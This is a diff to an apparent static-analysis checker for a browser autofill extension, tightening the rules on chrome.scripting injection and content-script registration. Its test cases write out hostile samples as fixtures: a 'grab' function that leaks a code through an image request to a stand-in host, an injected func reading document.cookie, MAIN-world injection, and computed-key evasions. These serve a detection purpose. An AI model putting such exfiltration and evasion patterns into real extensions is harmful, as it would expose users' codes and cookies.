@@ -109,6 +109,16 @@ const MANIFEST_POLICY = Object.freeze({
   // <global>.<member> with the global named bare, and only as reads (a write fails): fillFocused
   // checks that the frame is still on the origin the menu was opened on before it writes.
   injectedReads: ['location.origin'],
+  // Every chrome.scripting.executeScript( call takes one object literal written in the call, with
+  // keys from this list only (func required; args may be shorthand), and its target: is an object
+  // literal with keys from injectionTargetKeys: frames of one tab named by id, never allFrames,
+  // documentIds or world. No variable, call result, import, spread or computed key.
+  injectionKeys: ['target', 'func', 'args'],
+  injectionTargetKeys: ['tabId', 'frameIds'],
+  // registerContentScripts( and updateContentScripts( take one array literal of object literals
+  // (or of a const holding one, declared once and used nowhere else) with keys from this list
+  // only and a js: key: no world, matchOriginAsFallback, excludeMatches or css.
+  registrationKeys: ['id', 'matches', 'js', 'allFrames', 'runAt', 'persistAcrossSessions'],
   // The only files that may use chrome.permissions freely: the worker (reconciles grants with
   // bindings, so it is what gives up a site's access once its binding is removed) and the popup's
   // bind view (asks for exactly one site, in the click on Allow).
@@ -666,6 +676,42 @@ function closingToken(tokens, k) {
   return -1;
 }
 
+// The comma-separated items between the bracket at tokens[k] and its closing token, as [from, to)
+// token ranges (empty ones, such as after a trailing comma, dropped), with the index of the
+// closing token; null when it does not close.
+function bracketItems(tokens, k) {
+  const close = closingToken(tokens, k);
+  if (close < 0) return null;
+  const items = [];
+  let from = k + 1;
+  let depth = 0;
+  for (let j = k + 1; j < close; j += 1) {
+    const tok = tokens[j];
+    if (tok.t !== 'p') continue;
+    if (tok.v === '(' || tok.v === '[' || tok.v === '{') depth += 1;
+    else if (tok.v === ')' || tok.v === ']' || tok.v === '}') depth -= 1;
+    else if (tok.v === ',' && depth === 0) {
+      if (j > from) items.push([from, j]);
+      from = j + 1;
+    }
+  }
+  if (close > from) items.push([from, close]);
+  return { items, close };
+}
+
+// One item of an object literal: { key, value: [from, to) } for key: value (an identifier, string
+// or number key), { key, shorthand: true } for a lone identifier, { other: true } for a spread, a
+// computed key, a method or an accessor. `at` is its first token.
+function objectProperty(tokens, [from, to]) {
+  const first = tokens[from];
+  if (['id', 'str', 'num'].includes(first.t) && isPunct(tokens[from + 1], ':')) return { key: first.v, value: [from + 2, to], at: first };
+  if (first.t === 'id' && to === from + 1) return { key: first.v, shorthand: true, at: first };
+  return { other: true, at: first };
+}
+
+// Whether the token range [from, to) is exactly one object literal.
+const isObjectLiteral = (tokens, [from, to]) => isPunct(tokens[from], '{') && closingToken(tokens, from) === to - 1;
+
 // Whether tokens[k] starts a function expression: function, async, x => or (...) =>.
 function startsFunction(tokens, k) {
   const tok = tokens[k];
@@ -976,6 +1022,92 @@ function scriptingFileHits(text, label) {
     if (tok.t !== 'id' || !injected.has(tok.v) || isDot(tokens[k - 1]) || allowedUse.has(k)) return;
     hits.push(`${at(tok)} ${tok.v} named other than in its one top-level declaration and as func: ${tok.v} (an assignment, another binding or a shadowing local would inject other code)`);
   });
+
+  // The calls themselves. An options object built anywhere but in the call (a variable, a call
+  // result, an import, a spread, a computed key, Object.fromEntries) carries keys the name checks
+  // above never see, so each call takes its options as literals written in it:
+  // - executeScript: one object literal with keys from injectionKeys (func required; only args
+  //   may be shorthand), whose target: is an object literal with keys from injectionTargetKeys.
+  // - registerContentScripts / updateContentScripts: one array literal whose items are object
+  //   literals with keys from registrationKeys and a js: key (checked above), or a const holding
+  //   one: `const <name> = { ... };`, declared once, its name used nowhere else but as such an
+  //   item (not mutated, spread or passed on).
+  // Each of the three is called directly (chrome.scripting.<method>(...)), never referenced.
+  const { injectionKeys, injectionTargetKeys, registrationKeys } = MANIFEST_POLICY;
+  const checkedCalls = new Set(['executeScript', 'registerContentScripts', 'updateContentScripts']);
+  // The properties of the literal at tokens[k], each checked against `keys` (those in `shorthand`
+  // may be written alone). → Map(key -> property), or null when it does not close.
+  const objectProps = (k, keys, shorthand, what) => {
+    const r = bracketItems(tokens, k);
+    if (!r) {
+      hits.push(`${at(tokens[k])} ${what} does not close`);
+      return null;
+    }
+    const props = new Map();
+    for (const item of r.items) {
+      const p = objectProperty(tokens, item);
+      if (p.other) hits.push(`${at(p.at)} ${what} has a spread, computed key or method (only ${keys.join(', ')})`);
+      else if (!keys.includes(p.key)) hits.push(`${at(p.at)} ${what} key ${p.key} is not one of ${keys.join(', ')}`);
+      else if (props.has(p.key)) hits.push(`${at(p.at)} ${what} key ${p.key} given twice`);
+      else if (p.shorthand && !shorthand.includes(p.key)) hits.push(`${at(p.at)} ${what} key ${p.key} written as shorthand`);
+      else props.set(p.key, p);
+    }
+    return props;
+  };
+  const checkRegistration = (k) => {
+    const props = objectProps(k, registrationKeys, registrationKeys.filter((key) => key !== 'js'), 'content-script registration');
+    if (props && !props.has('js')) hits.push(`${at(tokens[k])} content-script registration without a js: key`);
+  };
+  // `const <name> = { ... };` → name -> [index of the name token, one per declaration]
+  const constObjects = new Map();
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'id' || tokens[k - 1]?.v !== 'const' || isDot(tokens[k - 2]) || !isPunct(tokens[k + 1], '=') || !isPunct(tokens[k + 2], '{')) return;
+    const close = closingToken(tokens, k + 2);
+    if (close >= 0 && isPunct(tokens[close + 1], ';')) constObjects.set(tok.v, [...(constObjects.get(tok.v) ?? []), k]);
+  });
+  const itemUses = new Set(); // token indices where a registration const stands as an item
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'id' || tok.v !== 'chrome' || !isDot(tokens[k + 1]) || tokens[k + 2]?.v !== 'scripting' || !isDot(tokens[k + 3])) return;
+    const method = tokens[k + 4];
+    if (method?.t !== 'id' || !checkedCalls.has(method.v)) return;
+    const paren = isPunct(tokens[k + 5], '?.') ? k + 6 : k + 5;
+    const shown = `chrome.scripting.${method.v}`;
+    if (!isPunct(tokens[paren], '(')) {
+      hits.push(`${at(tok)} ${shown} other than called directly`);
+      return;
+    }
+    const open = paren + 1;
+    const want = method.v === 'executeScript' ? '{' : '[';
+    const end = isPunct(tokens[open], want) ? closingToken(tokens, open) : -1;
+    const last = isPunct(tokens[end + 1], ',') ? end + 2 : end + 1;
+    if (end < 0 || !isPunct(tokens[last], ')')) {
+      hits.push(`${at(tok)} ${shown} takes other than one ${want === '{' ? 'object' : 'array'} literal written in the call (no variable, call result, import or spread)`);
+      return;
+    }
+    if (method.v === 'executeScript') {
+      const props = objectProps(open, injectionKeys, ['args'], 'executeScript options');
+      if (!props) return;
+      if (!props.has('func')) hits.push(`${at(tok)} ${shown} without func: (one of ${injectedFunctions.join(', ')})`);
+      const target = props.get('target');
+      if (target && !isObjectLiteral(tokens, target.value)) hits.push(`${at(target.at)} executeScript target: is not an object literal`);
+      else if (target) objectProps(target.value[0], injectionTargetKeys, injectionTargetKeys, 'executeScript target');
+      return;
+    }
+    for (const item of bracketItems(tokens, open).items) {
+      const [from, to] = item;
+      if (isObjectLiteral(tokens, item)) checkRegistration(from);
+      else if (to === from + 1 && tokens[from].t === 'id' && constObjects.get(tokens[from].v)?.length === 1) itemUses.add(from);
+      else hits.push(`${at(tokens[from])} ${shown} item is not an object literal or a const holding one`);
+    }
+  });
+  for (const name of new Set([...itemUses].map((k) => tokens[k].v))) {
+    const [decl] = constObjects.get(name);
+    checkRegistration(decl + 2);
+    tokens.forEach((tok, k) => {
+      if (tok.t !== 'id' || tok.v !== name || isDot(tokens[k - 1]) || k === decl || itemUses.has(k)) return;
+      hits.push(`${at(tok)} ${name} (a content-script registration) named other than in its const declaration and as a registerContentScripts/updateContentScripts item`);
+    });
+  }
   return { hits, named, injected };
 }
 
@@ -1274,7 +1406,7 @@ function runChecks(extDir) {
     'content-script-sinks',
     contentHits.length === 0,
     contentHits.length === 0
-      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]; injected func: [${MANIFEST_POLICY.injectedFunctions.join(', ')}] held to the same lists (plus reads of ${MANIFEST_POLICY.injectedReads.join(', ')}), each one top-level declaration named nowhere else, no files or css`
+      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]; injected func: [${MANIFEST_POLICY.injectedFunctions.join(', ')}] held to the same lists (plus reads of ${MANIFEST_POLICY.injectedReads.join(', ')}), each one top-level declaration named nowhere else, no files or css; executeScript and registration options are literals with keys {${MANIFEST_POLICY.injectionKeys.join(', ')}} and {${MANIFEST_POLICY.registrationKeys.join(', ')}}`
       : contentHits.join('; '),
   );
   record('inline-script', inline.length === 0, inline.length === 0 ? `no inline <script> or on*= in ${htmlCount} .html files` : inline.join('; '));
@@ -1346,6 +1478,9 @@ const PINNED_POLICY = {
   ],
   injectedFunctions: ['fillFocused'],
   injectedReads: ['location.origin'],
+  injectionKeys: ['args', 'func', 'target'],
+  injectionTargetKeys: ['frameIds', 'tabId'],
+  registrationKeys: ['persistAcrossSessions', 'runAt', 'allFrames', 'js', 'matches', 'id'],
   permissionsFiles: ['popup/popup.js', 'lib/autofill-worker.js'],
   permissionsMembersAnywhere: ['onAdded', 'onRemoved', 'contains'],
   contentScriptFiles: ['content/autofill.js', 'lib/fieldfind.js'],
@@ -1413,6 +1548,11 @@ const PIN_MUTATIONS = [
   ['injectedFunctions', (p) => (p.injectedFunctions = [])],
   ['injectedReads', (p) => p.injectedReads.push('location.href')],
   ['injectedReads', (p) => p.injectedReads.push('document.cookie')],
+  ['injectionKeys', (p) => p.injectionKeys.push('world')],
+  ['injectionKeys', (p) => (p.injectionKeys = p.injectionKeys.filter((k) => k !== 'func'))],
+  ['injectionTargetKeys', (p) => p.injectionTargetKeys.push('allFrames')],
+  ['registrationKeys', (p) => p.registrationKeys.push('world')],
+  ['registrationKeys', (p) => p.registrationKeys.push('matchOriginAsFallback')],
   ['permissionsFiles', (p) => p.permissionsFiles.push('popup/settings.js')],
   ['permissionsFiles', (p) => p.permissionsFiles.pop()],
   ['permissionsMembersAnywhere', (p) => p.permissionsMembersAnywhere.push('request')],
@@ -1506,9 +1646,10 @@ const WORKER_SOURCE = [
   "export async function syncRegistrations(origins) {",
   "  const matches = origins.map((origin) => `${origin}/*`);",
   "  const [current] = await chrome.scripting.getRegisteredContentScripts({ ids: ['autofill'] });",
+  "  const script = { id: 'autofill', matches, js: CONTENT_SCRIPTS, allFrames: true, runAt: 'document_idle', persistAcrossSessions: true };",
   "  if (matches.length === 0 && current) await chrome.scripting.unregisterContentScripts({ ids: ['autofill'] });",
-  "  else if (current) await chrome.scripting.updateContentScripts([{ id: 'autofill', matches }]);",
-  "  else await chrome.scripting.registerContentScripts([{ id: 'autofill', matches, js: CONTENT_SCRIPTS, allFrames: true, runAt: 'document_idle' }]);",
+  "  else if (current) await chrome.scripting.updateContentScripts([script]);",
+  "  else await chrome.scripting.registerContentScripts([script]);",
   "  const granted = await chrome.permissions.getAll();",
   "  const stale = (granted.origins ?? []).filter((pattern) => !matches.includes(pattern));",
   "  if (stale.length) await chrome.permissions.remove({ origins: stale });",
@@ -1647,7 +1788,8 @@ const FIELDFIND_SOURCE = [
 // chrome.tabs reads other files may make, tabs opened through lib/nav.js, plain forms, JSDoc
 // generics, CSS data: urls, chrome.scripting in the worker, chrome.permissions in the worker
 // and the two popup files, chrome.permissions.contains/onRemoved elsewhere, and the content
-// script's two files in the shapes the real ones have, registered through a const list).
+// script's two files in the shapes the real ones have, registered through a const list held by
+// a const registration object, as the real worker does).
 function cleanFixture() {
   return {
     manifest: {
@@ -1779,6 +1921,13 @@ const appendJs = (rel, code) => (fx) => {
 const editWorker = (from, to) => (fx) => {
   fx.files['lib/autofill-worker.js'] = replacedOnce(fx.files['lib/autofill-worker.js'], from, to);
 };
+// Replaces the fixture worker's one executeScript call.
+const editInjection = (to) => editWorker("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] });", to);
+// A worker function that would leak the code if it were injected instead of fillFocused.
+const appendGrab = appendJs('lib/autofill-worker.js', "function grab(code) { document.querySelector('img').src = '//x/?c=' + code; }\n");
+const importInWorker = (what) => editWorker("import { openOwnWindow } from './nav.js';", `import { openOwnWindow } from './nav.js';\nimport { ${what} } from './bindings.js';`);
+const REGISTRATION_OBJECT = "{ id: 'autofill', matches, js: CONTENT_SCRIPTS, allFrames: true, runAt: 'document_idle', persistAcrossSessions: true }";
+const both = (...mutations) => (fx) => mutations.forEach((mutate) => mutate(fx));
 const appendContent = (code) => appendJs('content/autofill.js', code);
 const setBackground = (value) => (fx) => {
   fx.manifest.background = value;
@@ -2375,6 +2524,92 @@ const CASES = [
   ['injected-origin-not-location', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  const here = el.origin;'), ['content-script-sinks'], /\.origin is not on the content-script member list \(in injected fillFocused\)/],
   ['injected-window-location-origin', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  const here = window.location.origin;'), ['content-script-sinks'], /\.location is not on the content-script member list \(in injected fillFocused\)/],
   ['content-location-origin', appendContent('const here = location.origin;\n'), ['content-script-sinks'], /\.origin is not on the content-script member list/],
+  // executeScript takes its options as one object literal written in the call: target (an object
+  // literal of tabId and frameIds), func (a pinned name, required) and args. Options built
+  // elsewhere could carry a func or files the name checks never see.
+  [
+    'ok-executescript-real-worker-shape',
+    both(
+      editInjection('const results = await chrome.scripting.executeScript({\n    target: { tabId, frameIds: [Number.isInteger(info.frameId) ? info.frameId : 0] },\n    func: fillFocused,\n    args: [code, expected],\n  });'),
+      editWorker('function fillFocused(code) {', 'function fillFocused(code, expected) {\n  if (location.origin !== expected) return false;'),
+    ),
+    [],
+  ],
+  ['ok-executescript-args-shorthand-quoted-func', editInjection("const args = ['123456'];\n  await chrome.scripting?.executeScript?.({ target: { tabId: tab.id, frameIds }, 'func': fillFocused, args, });"), []],
+  [
+    'executescript-options-computed-key',
+    both(editInjection("const options = { target: { tabId: tab.id, frameIds }, args: ['123456'] };\n  options['fu' + 'nc'] = grab;\n  await chrome.scripting.executeScript(options);"), appendGrab),
+    ['content-script-sinks'],
+    /chrome\.scripting\.executeScript takes other than one object literal written in the call/,
+  ],
+  [
+    'executescript-computed-key-in-literal',
+    both(editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, ['fu' + 'nc']: grab, args: ['123456'] });"), appendGrab),
+    ['content-script-sinks'],
+    /executeScript options has a spread, computed key or method/,
+  ],
+  [
+    'executescript-imported-options',
+    both(importInWorker('injection'), editInjection("await chrome.scripting.executeScript(injection(tab.id, '123456'));")),
+    ['content-script-sinks'],
+    /executeScript takes other than one object literal written in the call/,
+  ],
+  ['executescript-imported-identifier', both(importInWorker('injection'), editInjection('await chrome.scripting.executeScript(injection);')), ['content-script-sinks'], /executeScript takes other than one object literal/],
+  [
+    'executescript-imported-spread',
+    both(importInWorker('injection'), editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'], ...injection });")),
+    ['content-script-sinks'],
+    /executeScript options has a spread, computed key or method/,
+  ],
+  [
+    'executescript-fromentries',
+    both(editInjection("await chrome.scripting.executeScript(Object.fromEntries([['target', { tabId: tab.id }], ['fu' + 'nc', grab]]));"), appendGrab),
+    ['content-script-sinks'],
+    /executeScript takes other than one object literal/,
+  ],
+  ['executescript-method-func', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func() { return document.cookie; } });"), ['content-script-sinks'], /executeScript options has a spread, computed key or method/],
+  ['executescript-world-main', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'], world: 'MAIN' });"), ['content-script-sinks'], /executeScript options key world is not one of target, func, args/],
+  ['executescript-target-all-frames', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, allFrames: true }, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript target key allFrames is not one of tabId, frameIds/],
+  ['executescript-target-variable', editInjection("await chrome.scripting.executeScript({ target: where, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript target: is not an object literal/],
+  ['executescript-target-shorthand', editInjection("await chrome.scripting.executeScript({ target, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript options key target written as shorthand/],
+  ['executescript-target-spread', editInjection("await chrome.scripting.executeScript({ target: { ...where }, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript target has a spread/],
+  ['executescript-without-func', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, args: ['123456'] });"), ['content-script-sinks'], /executeScript without func:/],
+  ['executescript-duplicate-key', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'], args: extra });"), ['content-script-sinks'], /executeScript options key args given twice/],
+  ['executescript-second-argument', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] }, extra);"), ['content-script-sinks'], /executeScript takes other than one object literal/],
+  ['executescript-method-reference', appendJs('lib/autofill-worker.js', 'const run = chrome.scripting.executeScript;\n'), ['content-script-sinks'], /chrome\.scripting\.executeScript other than called directly/],
+  [
+    'executescript-call-method',
+    // chrome.scripting passed as `this` is also an alias.
+    editInjection("await chrome.scripting.executeScript.call(chrome.scripting, { target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] });"),
+    ['scripting-api', 'content-script-sinks'],
+    /chrome\.scripting\.executeScript other than called directly/,
+  ],
+  // registerContentScripts and updateContentScripts take one array literal of object literals, or
+  // of one const holding one that nothing else touches; each has a js: key and registrationKeys only.
+  [
+    'ok-registration-inline-literals',
+    both(
+      editWorker(`  const script = ${REGISTRATION_OBJECT};\n`, ''),
+      editWorker('updateContentScripts([script])', "updateContentScripts([{ id: 'autofill', matches, js: CONTENT_SCRIPTS }])"),
+      editWorker('registerContentScripts([script])', `registerContentScripts([${REGISTRATION_OBJECT}])`),
+    ),
+    [],
+  ],
+  ['registration-array-variable', editWorker('registerContentScripts([script])', 'registerContentScripts(scripts)'), ['content-script-sinks'], /registerContentScripts takes other than one array literal/],
+  ['registration-call-result', editWorker('registerContentScripts([script])', 'registerContentScripts(build(matches))'), ['content-script-sinks'], /registerContentScripts takes other than one array literal/],
+  ['registration-imported-object', both(importInWorker('registration'), editWorker('registerContentScripts([script])', 'registerContentScripts([registration])')), ['content-script-sinks'], /registerContentScripts item is not an object literal or a const holding one/],
+  ['registration-array-spread', editWorker('registerContentScripts([script])', 'registerContentScripts([...extra])'), ['content-script-sinks'], /registerContentScripts item is not an object literal or a const holding one/],
+  ['registration-object-spread', editWorker('updateContentScripts([script])', 'updateContentScripts([{ ...base, js: CONTENT_SCRIPTS }])'), ['content-script-sinks'], /content-script registration has a spread, computed key or method/],
+  ['registration-computed-key', editWorker('runAt: \'document_idle\', persistAcrossSessions', "runAt: 'document_idle', ['wor' + 'ld']: 'MAIN', persistAcrossSessions"), ['content-script-sinks'], /content-script registration has a spread, computed key or method/],
+  ['registration-world-key', editWorker('persistAcrossSessions: true }', "persistAcrossSessions: true, world: 'MAIN' }"), ['content-script-sinks'], /content-script registration key world is not one of/],
+  ['registration-match-origin-fallback', editWorker('persistAcrossSessions: true }', 'persistAcrossSessions: true, matchOriginAsFallback: true }'), ['content-script-sinks'], /content-script registration key matchOriginAsFallback is not one of/],
+  ['registration-update-without-js', editWorker('updateContentScripts([script])', "updateContentScripts([{ id: 'autofill', matches }])"), ['content-script-sinks'], /content-script registration without a js: key/],
+  ['registration-object-const-mutated', editWorker('  if (matches.length === 0 && current)', "  script.world = 'MAIN';\n  if (matches.length === 0 && current)"), ['content-script-sinks'], /script \(a content-script registration\) named other than/],
+  ['registration-const-object-assign', editWorker('  if (matches.length === 0 && current)', "  Object.assign(script, { world: 'MAIN' });\n  if (matches.length === 0 && current)"), ['content-script-sinks'], /script \(a content-script registration\) named other than/],
+  ['registration-const-mapped', editWorker('registerContentScripts([script])', 'registerContentScripts([script].map((s) => s))'), ['content-script-sinks'], /registerContentScripts takes other than one array literal/],
+  ['registration-const-not-literal', editWorker(`const script = ${REGISTRATION_OBJECT};`, `const script = Object.assign(${REGISTRATION_OBJECT}, extra);`), ['content-script-sinks'], /item is not an object literal or a const holding one/],
+  ['registration-let-object', editWorker(`const script = ${REGISTRATION_OBJECT};`, `let script = ${REGISTRATION_OBJECT};`), ['content-script-sinks'], /item is not an object literal or a const holding one/],
+  ['registration-method-reference', appendJs('lib/autofill-worker.js', 'const register = chrome.scripting.registerContentScripts;\n'), ['content-script-sinks'], /chrome\.scripting\.registerContentScripts other than called directly/],
 
   ['inline-script-body', addHtml('<script>document.title = 1;</script>'), ['inline-script']],
   [
